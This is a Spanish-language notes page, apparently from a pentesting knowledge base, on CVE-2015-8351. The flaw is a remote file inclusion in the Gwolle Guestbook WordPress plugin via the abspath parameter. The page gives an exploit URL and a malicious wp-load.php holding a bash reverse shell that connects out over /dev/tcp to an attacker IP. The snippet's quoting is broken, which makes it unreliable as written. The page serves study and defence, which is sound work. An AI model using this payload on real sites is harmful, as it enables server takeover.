---
description: Gwolle Guestbook Wordpress Plugin Remote File Inclusion (RFI)
cover: >-
  https://webdevolutions.blob.core.windows.net/cms/assets/Devolutions_is_CVE_Numbering_Authority_CNA_73ca6aa5df.png
coverY: -19
---

# ⚠️ RFI - CVE-2015-8351

{% hint style="info" %}
Enlaces sobre la vulnerabilidad:

1. [https://www.exploit-db.com/exploits/38861](https://www.exploit-db.com/exploits/38861)
2. [https://nvd.nist.gov/vuln/detail/CVE-2015-8351](https://nvd.nist.gov/vuln/detail/CVE-2015-8351)
3. [https://vuldb.com/es/?id.106363](https://vuldb.com/es/?id.106363)
4. [https://wpscan.com/vulnerability/65d869e8-5c50-4c82-9101-6b533da0c20](https://wpscan.com/vulnerability/65d869e8-5c50-4c82-9101-6b533da0c207)
{% endhint %}

Esta vulnerabilidad consiste en una Inclusión Remota de Archivos a través de una un parámetro vulnerable (abspath), afecta a las versiones 1.5.3 (Puede que versiones < 1.5.3)

{% hint style="warning" %}
Para que esta vulnerabilidad sea explotada, se debe de tener `allow_url_include` en 1. Si no tiene el valor 1, solo se podrán incluir archivos locales
{% endhint %}

Esto ocurre porque enviar una solicitud a la siguiente URL:

```http
http://mywebsite.com/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://192.168.11.1
```

Modificando el ultimo valor del ultimo parámetro, el servidor nos hará una petición, buscando el archivo wp-load.php, el cual podemos escribir nosotros con código malicioso PHP. Cuando la maquina ejecute este archivo escrito por nosotros, ejecutará el código PHP. Ejemplo del código PHP:

{% code title="wp-load.php" %}
```php
<?php
    system(bash -c "bash -i >& /dev/tcp/192.168.111.45/443 0>&1);
?>
// Reverse Shell Example
```
{% endcode %}

{% hint style="danger" %}
Existen Pruebas de Concepto (Proof of Concept - PoC) disponibles:

1. [https://github.com/igruntplay/exploit-CVE-2015-8351](https://github.com/igruntplay/exploit-CVE-2015-8351)
{% endhint %}
